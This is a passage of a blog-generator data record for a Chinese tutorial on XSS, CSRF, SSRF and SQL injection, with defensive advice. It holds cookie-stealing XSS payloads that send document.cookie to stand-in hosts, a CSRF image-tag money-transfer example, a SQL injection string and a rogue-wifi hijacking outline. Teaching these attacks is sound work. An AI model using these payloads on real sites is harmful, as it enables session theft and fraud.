开启一个特殊的DNS服务，将所有域名都解析到我们的电脑上，并把Wifi的DHCP-DNS设置为我们的电脑IP。\n\n3. 之后连上wifi的用户打开任何网站，请求都将被我们截取到。我们根据http头中的host字段来转发到真正服务器上。\n\n4. 收到服务器返回的数据之后，我们就可以实现网页脚本的注入，并返回给用户。\n\n5. 当注入的脚本被执行，用户的浏览器将依次预加载各大网站的常用脚本库。\n\n这个其实就是wifi流量劫持，中间人可以看到用户的每一个请求，可以在页面嵌入恶意代码，使用恶意代码获取用户的信息，可以返回钓鱼页面。\n\n##### 例子2：\n\n1. 还是提供一个免费wifi\n\n2. 在我们电脑上进行抓包\n\n3. 分析数据，可以获取用户的微信朋友圈、邮箱、社交网站帐号数据（HTTP）等。\n\n![](http://images2015.cnblogs.com/blog/555379/201602/555379-20160218233450956-14270563.png)\n\nPS：这个是测试在51job页面登录时进行抓包，可以获取帐号密码。\n\n结论：\n\n这攻击其实跟网站本身没有什么关系，只是数据被中间人获取了而已，而由于HTTP是明文传输的，所以是极可能被窃取的。\n\n开发安全措施：\n\n1. 使用HTTPS！就像《HTTP与HTTPS握手的那些事》这篇文章说的，HTTPS会在请求数据之前进行一次握手，使得客户端与服务端都有一个私钥，服务端用这个私钥加密，客户端用这个私钥解密，这样即使数据被人截取了，也是加密后的数据。\n\n总结\n\nXSS攻击的特点就是：尽一切办法在目标网站上执行非目标网站上原有的脚本（某篇文章说的）。本地的XSS攻击的示例2其实不算XSS攻击，只是简单流量劫持。前两种XSS攻击是我们开发时候要注意的，而流量劫持的则可以使用HTTPS提高安全性。\n\n## CSRF\n\nCSRF（Cross-site request forgery:跨站请求伪造）攻击者盗用用户的身份，并以其名义发送恶意请求。\n\n### 实例\n\n银行网站A，它以GET请求来完成银行转账的操作，如：`http://www.mybank.com/Transfer.php?toBankId=11&money=1000`\n\n危险网站B，它里面有一段HTML的代码如下：\n\n\t<img src=http://www.mybank.com/Transfer.php?toBankId=11&money=1000>\n\n用户登录了银行网站A，然后访问危险网站B，然后用户的银行账户就少了1000块......\n\n原因是银行网站A违反了HTTP规范，使用GET请求更新资源。在访问危险网站B的之前，用户已经登录了银行网站A，而B中的`<img>`以`GET`的方式请求第三方资源（这里的第三方就是指银行网站了，原本这是一个合法的请求，但这里被不法分子利用了），所以用户的浏览器会带上银行网站A的Cookie发出Get请求，去获取资源`http://www.mybank.com/Transfer.php?toBankId=11&money=1000`，结果银行网站服务器收到请求后，认为这是一个更新资源操作（转账操作），所以就立刻进行转账操作。\n\n## SSRF\n\nSSRF(Server-Side Request Forgery:服务器端请求伪造)是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）\n\n## 其他安全问题：\n\n### SQL注入\n\n是提交含有SQL操作语句的信息给后端，后端如果没有做好过滤就执行该语句，攻击者自然可以随意操纵该站点的数据库。\n\n比如有一个图书馆站点book.com，你点进一本书的详情页面，其url是这样的：\n\n`book.com/book?id=100`\n\n说明这本书在数据库中的键值是100，后端收到url参数后就执行了数据库查询操作：\n\n`select * from booktable where id='100'`\n\n那么如果我们把url更改为\n\n`book.com/book?id=100'or'1'='1`\n\n那么数据库操作执行就变成了：\n\n`select * from booktable where id='100'or'1'='1'`\n\n从而取出了整个booktable 表单的全部数据。\n\n****\n\n参考链接：\n* [前端安全之XSS攻击](http://www.cnblogs.com/lovesong/p/5199623.html)\n* [浅谈CSRF攻击方式](http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html)","source":"_posts/前端安全.md","raw":"---\n\ntitle: 前端安全：XSS和CSRF\ntags: ['js', '安全']\n\n---\n\n## XSS攻击\n\nXSS（cross-site scripting跨域脚本攻击）攻击是最常见的WEB攻击之一，其重点是“**跨域**”和“**客户端执行**”。\n\nXSS攻击分为三种\n\n* Reflected XSS\n* Stored XSS\n* DOM-based or loacl XSS\n\n<!-- more -->\n\n### Reflected XSS\n\n基于反射的XSS攻击，主要依靠站点服务端返回脚本，在客户端触发执行从而发起Web攻击。\n\n##### 例子，做个假设：\n\n1. 当亚马逊在搜索书籍，搜不到书的时候显示提交的名称。\n\n2. 在搜索框搜索内容，填入`<script>alert('handsome boy')</script>`, 点击搜索。\n\n3. 当前端页面没有对返回的数据进行过滤，直接显示在页面上， 这时就会alert那个字符串出来。\n\n4. 进而可以构造获取用户cookies的地址，通过QQ群或者垃圾邮件，来让其他人点击这个地址：\n`http://www.amazon.cn/search?name=<script>document.location='http://xxx/get?cookie='+document.cookie</script>`\n\n##### 例子：\n\n对于一个图书馆网站book.com\n\n假设右上角有一个搜索书籍的地方，可以按书名搜索书籍（book.com/search?name=时间简史），于是弹出《时间简史》的相关信息。\n\n但是如果输入`<script>alert('没有书开个毛线书店啊')</script>`，假设这个图书馆站点没有对数据做任何过滤，而且会原封不动地把用户输入的数据展示回来，那么返回的页面自然也会返回这段脚本，从而执行它。\n\n既然要做攻击，我们就要获取用户的数据，要获取数据自然要把信息传回我们的服务器（假设接收信息的地址是http://vajoy/get），那么可以这样写：\n`<script>document.location='http://vajoy/get?cookie='+document.cookie</script>`\n\n不过这样收到的总是我们自己的数据，我们要收集的应该是别人的cookie信息。\n\n所以之后便可以通过QQ群，或者通过群发垃圾邮件，来让其他人点击这个地址：\n`book.com/search?name=<script>document.location='http://vajoy/get?cookie='+document.cookie</script>`\n\n这样就可以依靠站点服务端返回脚本，在客户端触发执行从而发起WEB攻击，进行Reflected XSS攻击。\n\n#### 开发安全措施\n\n1. 前端在显示服务端数据时候，不仅是标签内容需要过滤、转义，就连属性值也都可能需要。\n\n2. 后端接收请求时，验证请求是否为攻击请求，攻击则屏蔽。\n\n##### 例如：\n\n标签：\n\n`<span><script>alert('handsome boy')</script></span>`\n\n转义\n\n`<span>&lt;script&gt;alert(&#39;handsome boy&#39;)&lt;/script&gt</span>`\n\n属性：\n\n如果一个input的value属性值是\n\n`琅琊榜\" onclick=\"javascript:alert('handsome boy')`\n就可能出现\n\n`<input type=\"text\" value=\"琅琊榜\" onclick=\"javascript:alert('handsome boy')\">`\n\n点击input导致攻击脚本被执行，解决方式可以对script或者双引号进行过滤。\n\n### Stored XSS\n\n基于存储的XSS攻击，是通过发表带有恶意跨域脚本的帖子/文章，从而把恶意脚本存储在服务器，每个访问该帖子/文章的人就会触发执行。\n\n##### 例子：\n\n1. 发一篇文章，里面包含了恶意脚本\n\n\t`今天天气不错啊！<script>alert('handsome boy')</script>`\n\n2. 后端没有对文章进行过滤，直接保存文章内容到数据库。\n\n3. 当其他看这篇文章的时候，包含的恶意脚本就会执行。\n\n> 因为大部分文章是保存整个HTML内容的，前端显示时候也不做过滤，就极可能出现这种情况。\n\n##### 结论：\n\n后端尽可能对提交数据做过滤，在场景需求而不过滤的情况下，前端就需要做些处理了。\n\n##### 开发安全措施：\n\n1. 首要是服务端要进行过滤，因为前端的校验可以被绕过。\n\n2. 当服务端不校验时候，前端要以各种方式过滤里面可能的恶意脚本，例如script标签，将特殊字符转换成HTML编码。\n\n### DOM-based or local XSS\n\n基于DOM或本地的XSS攻击。一般是提供一个免费的wifi，但是提供免费wifi的网关会往你访问的任何页面插入一段脚本或者是直接返回一个钓鱼页面，从而植入恶意脚本。这种直接存在于页面，无须经过服务器返回就是基于本地的XSS攻击。\n\n##### 例子1：\n\n1. 提供一个免费的wifi。\n\n2. 开启一个特殊的DNS服务，将所有域名都解析到我们的电脑上，并把Wifi的DHCP-DNS设置为我们的电脑IP。\n\n3. 之后连上wifi的用户打开任何网站，请求都将被我们截取到。我们根据http头中的host字段来转发到真正服务器上。\n\n4. 收到服务器返回的数据之后，我们就可以实现网页脚本的注入，并返回给用户。\n\n5. 当注入的脚本被执行，用户的浏览器将依次预加载各大网站的常用脚本库。\n\n这个其实就是wifi流量劫持，中间人可以看到用户的每一个请求，可以在页面嵌入恶意代码，使用恶意代码获取用户的信息，可以返回钓鱼页面。\n\n##### 例子2：\n\n1. 还是提供一个免费wifi\n\n2. 在我们电脑上进行抓包\n\n3. 分析数据，可以获取用户的微信朋友圈、邮箱、社交网站帐号数据（HTTP）等。\n\n![](http://images2015.cnblogs.com/blog/555379/201602/555379-20160218233450956-14270563.png)\n\nPS：这个是测试在51job页面登录时进行抓包，可以获取帐号密码。\n\n结论：\n\n这攻击其实跟网站本身没有什么关系，只是数据被中间人获取了而已，而由于HTTP是明文传输的，所以是极可能被窃取的。\n\n开发安全措施：\n\n1. 使用HTTPS！就像《HTTP与HTTPS握手的那些事》这篇文章说的，HTTPS会在请求数据之前进行一次握手，使得客户端与服务端都有一个私钥，服务端用这个私钥加密，客户端用这个私钥解密，这样即使数据被人截取了，也是加密后的数据。\n\n总结\n\nXSS攻击的特点就是：尽一切办法在目标网站上执行非目标网站上原有的脚本（某篇文章说的）。本地的XSS攻击的示例2其实不算XSS攻击，只是简单流量劫持。前两种XSS攻击是我们开发时候要注意的，而流量劫持的则可以使用HTTPS提高安全性。\n\n## CSRF\n\nCSRF（Cross-site request forgery:跨站请求伪造）攻击者盗用用户的身份，并以其名义发送恶意请求。\n\n### 实例\n\n银行网站A，它以GET请求来完成银行转账的操作，如：`http://www.mybank.com/Transfer.php?toBankId=11&money=1000`\n\n危险网站B，它里面有一段HTML的代码如下：\n\n\t<img src=http://www.mybank.com/Transfer.php?toBankId=11&money=1000>\n\n用户登录了银行网站A，然后访问危险网站B，然后用户的银行账户就少了1000块......\n\n原因是银行网站A违反了HTTP规范，使用GET请求更新资源。在访问危险网站B的之前，用户已经登录了银行网站A，而B中的`<img>`以`GET`的方式请求第三方资源（这里的第三方就是指银行网站了，原本这是一个合法的请求，但这里被不法分子利用了），所以用户的浏览器会带上银行网站A的Cookie发出Get请求，去获取资源`http://www.mybank.com/Transfer.php?toBankId=11&money=1000`，结果银行网站服务器收到请求后，认为这是一个更新资源操作（转账操作），所以就立刻进行转账操作。\n\n## SSRF\n\nSSRF(Server-Side Request Forgery:服务器端请求伪造)是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）\n\n## 其他安全问题：\n\n### SQL注入\n\n是提交含有SQL操作语句的信息给后端，后端如果没有做好过滤就执行该语句，攻击者自然可以随意操纵该站点的数据库。\n\n比如有一个图书馆站点book.com，你点进一本书的详情页面，其url是这样的：\n\n`book.com/book?id=100`\n\n说明这本书在数据库中的键值是100，后端收到url参数后就执行了数据库查询操作：\n\n`select * from booktable where id='100'`\n\n那么如果我们把url更改为\n\n`book.com/book?id=100'or'1'='1`\n\n那么数据库操作执行就变成了：\n\n`select * from booktable where id='100'or'1'='1'`\n\n从而取出了整个booktable 表单的全部数据。\n\n****\n\n参考链接：\n* [前端安全之XSS攻击](http://www.cnblogs.com/lovesong/p/5199623.html)\n* [浅谈CSRF攻击方式](http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html)","slug":"前端安全","published":1,"date":"2017-04-11T12:31:51.756Z","updated":"2017-04-11T12:52:27.082Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj9ft3s4e000cl8slgmxthh5j","content":"<h2 id=\"XSS攻击\"><a href=\"#XSS攻击\" class=\"headerlink\" title=\"XSS攻击\"></a>XSS攻击</h2><p>XSS（cross-site scripting跨域脚本攻击）攻击是最常见的WEB攻击之一，其重点是“<strong>跨域</strong>”和“<strong>客户端执行</strong>”。</p>\n<p>XSS攻击分为三种</p>\n<ul>\n<li>Reflected XSS</li>\n<li>Stored XSS</li>\n<li>DOM-based or loacl XSS</li>\n</ul>\n<a id=\"more\"></a>\n<h3 id=\"Reflected-XSS\"><a href=\"#Reflected-XSS\" class=\"headerlink\" title=\"Reflected XSS\"></a>Reflected XSS</h3><p>基于反射的XSS攻击，主要依靠站点服务端返回脚本，在客户端触发执行从而发起Web攻击。</p>\n<h5 id=\"例子，做个假设：\"><a href=\"#例子，做个假设：\" class=\"headerlink\" title=\"例子，做个假设：\"></a>例子，做个假设：</h5><ol>\n<li><p>当亚马逊在搜索书籍，搜不到书的时候显示提交的名称。</p>\n</li>\n<li><p>在搜索框搜索内容，填入<code>&lt;script&gt;alert(&#39;handsome boy&#39;)&lt;/script&gt;</code>, 点击搜索。</p>\n</li>\n<li><p>当前端页面没有对返回的数据进行过滤，直接显示在页面上， 这时就会alert那个字符串出来。</p>\n</li>\n<li><p>进而可以构造获取用户cookies的地址，通过QQ群或者垃圾邮件，来让其他人点击这个地址：<br><code>http://www.amazon.cn/search?name=&lt;script&gt;document.location=&#39;http://xxx/get?cookie=&#39;+document.cookie&lt;/script&gt;</code></p>\n</li>\n</ol>\n<h5 id=\"例子：\"><a href=\"#例子：\" class=\"headerlink\" title=\"例子：\"></a>例子：</h5><p>对于一个图书馆网站book.com</p>\n<p>假设右上角有一个搜索书籍的地方，可以按书名搜索书籍（book.com/search?name=时间简史），于是弹出《时间简史》的相关信息。</p>\n<p>但是如果输入<code>&lt;script&gt;alert(&#39;没有书开个毛线书店啊&#39;)&lt;/script&gt;</code>，假设这个图书馆站点没有对数据做任何过滤，而且会原封不动地把用户输入的数据展示回来，那么返回的页面自然也会返回这段脚本，从而执行它。</p>\n<p>既然要做攻击，我们就要获取用户的数据，要获取数据自然要把信息传回我们的服务器（假设接收信息的地址是<a href=\"http://vajoy/get），那么可以这样写：\" target=\"_blank\" rel=\"external\">http://vajoy/get），那么可以这样写：</a><br><code>&lt;script&gt;document.location=&#39;http://vajoy/get?cookie=&#39;+document.cookie&lt;/script&gt;</code></p>\n<p>不过这样收到的总是我们自己的数据，我们要收集的应该是别人的cookie信息。</p>\n<p>所以之后便可以通过QQ群，或者通过群发垃圾邮件，来让其他人点击这个地址：<br><code>book.com/search?name=&lt;script&gt;document.location=&#39;http://vajoy/get?cookie=&#39;+document.cookie&lt;/script&gt;</code></p>\n<p>这样就可以依靠站点服务端返回脚本，在客户端触发执行从而发起WEB攻击，进行Reflected XSS攻击。</p>\n<h4 id=\"开发安全措施\"><a href=\"#开发安全措施\" class=\"headerlink\" title=\"开发安全措施\"></a>开发安全措施</h4><ol>\n<li><p>前端在显示服务端数据时候，不仅是标签内容需要过滤、转义，就连属性值也都可能需要。</p>\n</li>\n<li><p>后端接收请求时，验证请求是否为攻击请求，攻击则屏蔽。</p>\n</li>\n</ol>\n<h5 id=\"例如：\"><a href=\"#例如：\" class=\"headerlink\" title=\"例如：\"></a>例如：</h5><p>标签：</p>\n<p><code>&lt;span&gt;&lt;script&gt;alert(&#39;handsome boy&#39;)&lt;/script&gt;&lt;/span&gt;</code></p>\n<p>转义</p>\n<p><code>&lt;span&gt;&amp;lt;script&amp;gt;alert(&amp;#39;handsome boy&amp;#39;)&amp;lt;/script&amp;gt&lt;/span&gt;</code></p>\n<p>属性：</p>\n<p>如果一个input的value属性值是</p>\n<p><code>琅琊榜&quot; onclick=&quot;javascript:alert(&#39;handsome boy&#39;)</code><br>就可能出现</p>\n<p><code>&lt;input type=&quot;text&quot; value=&quot;琅琊榜&quot; onclick=&quot;javascript:alert(&#39;handsome boy&#39;)&quot;&gt;</code></p>\n<p>点击input导致攻击脚本被执行，解决方式可以对script或者双引号进行过滤。</p>\n<h3 id=\"Stored-XSS\"><a href=\"#Stored-XSS\" class=\"headerlink\" title=\"Stored XSS\"></a>Stored XSS</h3><p>基于存储的XSS攻击，是通过发表带有恶意跨域脚本的帖子/文章，从而把恶意脚本存储在服务器，每个访问该帖子/文章的人就会触发执行。</p>\n<h5 id=\"例子：-1\"><a href=\"#例子：-1\" class=\"headerlink\" title=\"例子：\"></a>例子：</h5><ol>\n<li><p>发一篇文章，里面包含了恶意脚本</p>\n<p> <code>今天天气不错啊！&lt;script&gt;alert(&#39;handsome boy&#39;)&lt;/script&gt;</code></p>\n</li>\n<li><p>后端没有对文章进行过滤，直接保存文章内容到数据库。</p>\n</li>\n<li><p>当其他看这篇文章的时候，包含的恶意脚本就会执行。</p>\n</li>\n</ol>\n<blockquote>\n<p>因为大部分文章是保存整个HTML内容的，前端显示时候也不做过滤，就极可能出现这种情况。</p>\n</blockquote>\n<h5 id=\"结论：\"><a href=\"#结论：\" class=\"headerlink\" title=\"结论：\"></a>结论：</h5><p>后端尽可能对提交数据做过滤，在场景需求而不过滤的情况下，前端就需要做些处理了。</p>\n<h5 id=\"开发安全措施：\"><a href=\"#开发安全措施：\" class=\"headerlink\" title=\"开发安全措施：\"></a>开发安全措施：</h5><ol>\n<li><p>首要是服务端要进行过滤，因为前端的校验可以被绕过。</p>\n</li>\n<li><p>当服务端不校验时候，前端要以各种方式过滤里面可能的恶意脚本，例如script标签，将特殊字符转换成HTML编码。</p>\n</li>\n</ol>\n<h3 id=\"DOM-based-or-local-XSS\"><a href=\"#DOM-based-or-local-XSS\" class=\"headerlink\" title=\"DOM-based or local XSS\"></a>DOM-based or local XSS</h3><p>基于DOM或本地的XSS攻击。一般是提供一个免费的wifi，但是提供免费wifi的网关会往你访问的任何页面插入一段脚本或者是直接返回一个钓鱼页面，从而植入恶意脚本。这种直接存在于页面，无须经过服务器返回就是基于本地的XSS攻击。</p>\n<h5 id=\"例子1：\"><a href=\"#例子1：\" class=\"headerlink\" title=\"例子1：\"></a>例子1：</h5><ol>\n<li><p>提供一个免费的wifi。</p>\n</li>\n<li><p>开启一个特殊的DNS服务，将所有域名都解析到我们的电脑上，并把Wifi的DHCP-DNS设置为我们的电脑IP。</p>\n</li>\n<li><p>之后连上wifi的用户打开任何网站，请求都将被我们截取到。我们根据http头中的host字段来转发到真正服务器上。</p>\n</li>\n<li><p>收到服务器返回的数据之后，我们就可以实现网页脚本的注入，并返回给用户。</p>\n</li>\n<li><p>当注入的脚本被执行，用户的浏览器将依次预加载各大网站的常用脚本库。</p>\n</li>\n</ol>\n<p>这个其实就是wifi流量劫持，中间人可以看到用户的每一个请求，可以在页面嵌入恶意代码，使用恶意代码获取用户的信息，可以返回钓鱼页面。</p>\n<h5 id=\"例子2：\"><a href=\"#例子2：\" class=\"headerlink\" title=\"例子2：\"></a>例子2：</h5><ol>\n<li><p>还是提供一个免费wifi</p>\n</li>\n<li><p>在我们电脑上进行抓包</p>\n</li>\n<li><p>分析数据，可以获取用户的微信朋友圈、邮箱、社交网站帐号数据（HTTP）等。</p>\n</li>\n</ol>\n<p><img src=\"http://images2015.cnblogs.com/blog/555379/201602/555379-20160218233450956-14270563.png\" alt=\"\"></p>\n<p>PS：这个是测试在51job页面登录时进行抓包，可以获取帐号密码。</p>\n<p>结论：</p>\n<p>这攻击其实跟网站本身没有什么关系，只是数据被中间人获取了而已，而由于HTTP是明文传输的，所以是极可能被窃取的。</p>\n<p>开发安全措施：</p>\n<ol>\n<li>使用HTTPS！就像《HTTP与HTTPS握手的那些事》这篇文章说的，HTTPS会在请求数据之前进行一次握手，使得客户端与服务端都有一个私钥，服务端用这个私钥加密，客户端用这个私钥解密，这样即使数据被人截取了，也是加密后的数据。</li>\n</ol>\n<p>总结</p>\n<p>XSS攻击的特点就是：尽一切办法在目标网站上执行非目标网站上原有的脚本（某篇文章说的）。本地的XSS攻击的示例2其实不算XSS攻击，只是简单流量劫持。前两种XSS攻击是我们开发时候要注意的，而流量劫持的则可以使用HTTPS提高安全性。</p>\n<h2 id=\"CSRF\"><a href=\"#CSRF\" class=\"headerlink\" title=\"CSRF\"></a>CSRF</h2><p>CSRF（Cross-site request forgery:跨站请求伪造）攻击者盗用用户的身份，并以其名义发送恶意请求。</p>\n<h3 id=\"实例\"><a href=\"#实例\" class=\"headerlink\" title=\"实例\"></a>实例</h3><p>银行网站A，它以GET请求来完成银行转账的操作，如：<code>http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</code></p>\n<p>危险网站B，它里面有一段HTML的代码如下：</p>\n<pre><code>&lt;img src=http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt;\n</code></pre><p>用户登录了银行网站A，然后访问危险网站B，然后用户的银行账户就少了1000块……</p>\n<p>原因是银行网站A违反了HTTP规范，使用GET请求更新资源。在访问危险网站B的之前，用户已经登录了银行网站A，而B中的<code>&lt;img&gt;</code>以<code>GET</code>的方式请求第三方资源（这里的第三方就是指银行网站了，原本这是一个合法的请求，但这里被不法分子利用了），所以用户的浏览器会带上银行网站A的Cookie发出Get请求，去获取资源<code>http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</code>，结果银行网站服务器收到请求后，认为这是一个更新资源操作（转账操作），所以就立刻进行转账操作。</p>\n<h2 id=\"SSRF\"><a href=\"#SSRF\" class=\"headerlink\" title=\"SSRF\"></a>SSRF</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造)是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>\n<h2 id=\"其他安全问题：\"><a href=\"#其他安全问题：\" class=\"headerlink\" title=\"其他安全问题：\"></a>其他安全问题：</h2><h3 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h3><p>是提交含有SQL操作语句的信息给后端，后端如果没有做好过滤就执行该语句，攻击者自然可以随意操纵该站点的数据库。</p>\n<p>比如有一个图书馆站点book.com，你点进一本书的详情页面，其url是这样的：</p>\n<p><code>book.com/book?id=100</code></p>\n<p>说明这本书在数据库中的键值是100，后端收到url参数后就执行了数据库查询操作：</p>\n<p><code>select * from booktable where id=&#39;100&#39;</code></p>\n<p>那么如果我们把url更改为</p>\n<p><code>book.com/book?id=100&#39;or&#39;1&#39;=&#39;1</code></p>\n<p>那么数据库操作执行就变成了：</p>\n<p><code>select * from booktable where id=&#39;100&#39;or&#39;1&#39;=&#39;1&#39;</code></p>\n<p>从而取出了整个booktable 表单的全部数据。</p>\n<hr>\n<p>参考链接：</p>\n<ul>\n<li><a href=\"http://www.cnblogs.com/lovesong/p/5199623.html\" target=\"_blank\" rel=\"external\">前端安全之XSS攻击</a></li>\n<li><a href=\"http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html\" target=\"_blank\" rel=\"external\">浅谈CSRF攻击方式</a></li>\n</ul>\n","site":{"data":{"head":{"Name":"<script> var _hmt = _hmt || []; (function() { var hm = document.createElement('script'); hm.src = 'https://hm.baidu.com/hm.js?348e7e9c1ba7a17f316c54cb6795dec7'; var s = document.getElementsByTagName('script')[0];  s.parentNode.insertBefore(hm, s); })(); </script>"}}},"excerpt":"<h2 id=\"XSS攻击\"><a href=\"#XSS攻击\" class=\"headerlink\" title=\"XSS攻击\"></a>XSS攻击</h2><p>XSS（cross-site scripting跨域脚本攻击）攻击是最常见的WEB攻击之一，其重点是“<strong>跨域</strong>”和“<strong>客户端执行</strong>”。</p>\n<p>XSS攻击分为三种</p>\n<ul>\n<li>Reflected XSS</li>\n<li>Stored XSS</li>\n<li>DOM-based or loacl XSS</li>\n</ul>","more":"<h3 id=\"Reflected-XSS\"><a href=\"#Reflected-XSS\" class=\"headerlink\" title=\"Reflected XSS\"></a>Reflected XSS</h3><p>基于反射的XSS攻击，主要依靠站点服务端返回脚本，在客户端触发执行从而发起Web攻击。</p>\n<h5 id=\"例子，做个假设：\"><a href=\"#例子，做个假设：\" class=\"headerlink\" title=\"例子，做个假设：\"></a>例子，做个假设：</h5><ol>\n<li><p>当亚马逊在搜索书籍，搜不到书的时候显示提交的名称。</p>\n</li>\n<li><p>在搜索框搜索内容，填入<code>&lt;script&gt;alert(&#39;handsome boy&#39;)&lt;/script&gt;</code>, 点击搜索。</p>\n</li>\n<li><p>当前端页面没有对返回的数据进行过滤，直接显示在页面上， 这时就会alert那个字符串出来。</p>\n</li>\n<li><p>进而可以构造获取用户cookies的地址，通过QQ群或者垃圾邮件，来让其他人点击这个地址：<br><code>http://www.amazon.cn/search?name=&lt;script&gt;document.location=&#39;http://xxx/get?cookie=&#39;+document.cookie&lt;/script&gt;</code></p>\n</li>\n</ol>\n<h5 id=\"例子：\"><a href=\"#例子：\" class=\"headerlink\" title=\"例子：\"></a>例子：</h5><p>对于一个图书馆网站book.com</p>\n<p>假设右上角有一个搜索书籍的地方，可以按书名搜索书籍（book.com/search?name=时间简史），于是弹出《时间简史》的相关信息。</p>\n<p>但是如果输入<code>&lt;script&gt;alert(&#39;没有书开个毛线书店啊&#39;)&lt;/script&gt;</code>，假设这个图书馆站点没有对数据做任何过滤，而且会原封不动地把用户输入的数据展示回来，那么返回的页面自然也会返回这段脚本，从而执行它。</p>\n<p>既然要做攻击，我们就要获取用户的数据，要获取数据自然要把信息传回我们的服务器（假设接收信息的地址是<a href=\"http://vajoy/get），那么可以这样写：\">http://vajoy/get），那么可以这样写：</a><br><code>&lt;script&gt;document.location=&#39;http://vajoy/get?cookie=&#39;+document.cookie&lt;/script&gt;</code></p>\n<p>不过这样收到的总是我们自己的数据，我们要收集的应该是别人的cookie信息。</p>\n<p>所以之后便可以通过QQ群，或者通过群发垃圾邮件，来让其他人点击这个地址：<br><code>book.com/search?name=&lt;script&gt;document.location=&#39;http://vajoy/get?cookie=&#39;+document.cookie&lt;/script&gt;</code></p>\n<p>这样就可以依靠站点服务端返回脚本，在客户端触发执行从而发起WEB攻击，进行Reflected XSS攻击。</p>\n<h4 id=\"开发安全措施\"><a href=\"#开发安全措施\" class=\"headerlink\" title=\"开发安全措施\"></a>开发安全措施</h4><ol>\n<li><p>前端在显示服务端数据时候，不仅是标签内容需要过滤、转义，就连属性值也都可能需要。</p>\n</li>\n<li><p>后端接收请求时，验证请求是否为攻击请求，攻击则屏蔽。</p>\n</li>\n</ol>\n<h5 id=\"例如：\"><a href=\"#例如：\" class=\"headerlink\" title=\"例如：\"></a>例如：</h5><p>标签：</p>\n<p><code>&lt;span&gt;&lt;script&gt;alert(&#39;handsome boy&#39;)&lt;/script&gt;&lt;/span&gt;</code></p>\n<p>转义</p>\n<p><code>&lt;span&gt;&amp;lt;script&amp;gt;alert(&amp;#39;handsome boy&amp;#39;)&amp;lt;/script&amp;gt&lt;/span&gt;</code></p>\n<p>属性：</p>\n<p>如果一个input的value属性值是</p>\n<p><code>琅琊榜&quot; onclick=&quot;javascript:alert(&#39;handsome boy&#39;)</code><br>就可能出现</p>\n<p><code>&lt;input type=&quot;text&quot; value=&quot;琅琊榜&quot; onclick=&quot;javascript:alert(&#39;handsome boy&#39;)&quot;&gt;</code></p>\n<p>点击input导致攻击脚本被执行，解决方式可以对script或者双引号进行过滤。</p>\n<h3 id=\"Stored-XSS\"><a href=\"#Stored-XSS\" class=\"headerlink\" title=\"Stored XSS\"></a>Stored XSS</h3><p>基于存储的XSS攻击，是通过发表带有恶意跨域脚本的帖子/文章，从而把恶意脚本存储在服务器，每个访问该帖子/文章的人就会触发执行。</p>\n<h5 id=\"例子：-1\"><a href=\"#例子：-1\" class=\"headerlink\" title=\"例子：\"></a>例子：</h5><ol>\n<li><p>发一篇文章，里面包含了恶意脚本</p>\n<p> <code>今天天气不错啊！&lt;script&gt;alert(&#39;handsome boy&#39;)&lt;/script&gt;</code></p>\n</li>\n<li><p>后端没有对文章进行过滤，直接保存文章内容到数据库。</p>\n</li>\n<li><p>当其他看这篇文章的时候，包含的恶意脚本就会执行。</p>\n</li>\n</ol>\n<blockquote>\n<p>因为大部分文章是保存整个HTML内容的，前端显示时候也不做过滤，就极可能出现这种情况。</p>\n</blockquote>\n<h5 id=\"结论：\"><a href=\"#结论：\" class=\"headerlink\" title=\"结论：\"></a>结论：</h5><p>后端尽可能对提交数据做过滤，在场景需求而不过滤的情况下，前端就需要做些处理了。</p>\n<h5 id=\"开发安全措施：\"><a href=\"#开发安全措施：\" class=\"headerlink\" title=\"开发安全措施：\"></a>开发安全措施：</h5><ol>\n<li><p>首要是服务端要进行过滤，因为前端的校验可以被绕过。</p>\n</li>\n<li><p>当服务端不校验时候，前端要以各种方式过滤里面可能的恶意脚本，例如script标签，将特殊字符转换成HTML编码。</p>\n</li>\n</ol>\n<h3 id=\"DOM-based-or-local-XSS\"><a href=\"#DOM-based-or-local-XSS\" class=\"headerlink\" title=\"DOM-based or local XSS\"></a>DOM-based or local XSS</h3><p>基于DOM或本地的XSS攻击。一般是提供一个免费的wifi，但是提供免费wifi的网关会往你访问的任何页面插入一段脚本或者是直接返回一个钓鱼页面，从而植入恶意脚本。这种直接存在于页面，无须经过服务器返回就是基于本地的XSS攻击。</p>\n<h5 id=\"例子1：\"><a href=\"#例子1：\" class=\"headerlink\" title=\"例子1：\"></a>例子1：</h5><ol>\n<li><p>提供一个免费的wifi。</p>\n</li>\n<li><p>开启一个特殊的DNS服务，将所有域名都解析到我们的电脑上，并把Wifi的DHCP-DNS设置为我们的电脑IP。</p>\n</li>\n<li><p>之后连上wifi的用户打开任何网站，请求都将被我们截取到。我们根据http头中的host字段来转发到真正服务器上。</p>\n</li>\n<li><p>收到服务器返回的数据之后，我们就可以实现网页脚本的注入，并返回给用户。</p>\n</li>\n<li><p>当注入的脚本被执行，用户的浏览器将依次预加载各大网站的常用脚本库。</p>\n</li>\n</ol>\n<p>这个其实就是wifi流量劫持，中间人可以看到用户的每一个请求，可以在页面嵌入恶意代码，使用恶意代码获取用户的信息，可以返回钓鱼页面。</p>\n<h5 id=\"例子2：\"><a href=\"#例子2：\" class=\"headerlink\" title=\"例子2：\"></a>例子2：</h5><ol>\n<li><p>还是提供一个免费wifi</p>\n</li>\n<li><p>在我们电脑上进行抓包</p>\n</li>\n<li><p>分析数据，可以获取用户的微信朋友圈、邮箱、社交网站帐号数据（HTTP）等。</p>\n</li>\n</ol>\n<p><img src=\"http://images2015.cnblogs.com/blog/555379/201602/555379-20160218233450956-14270563.png\" 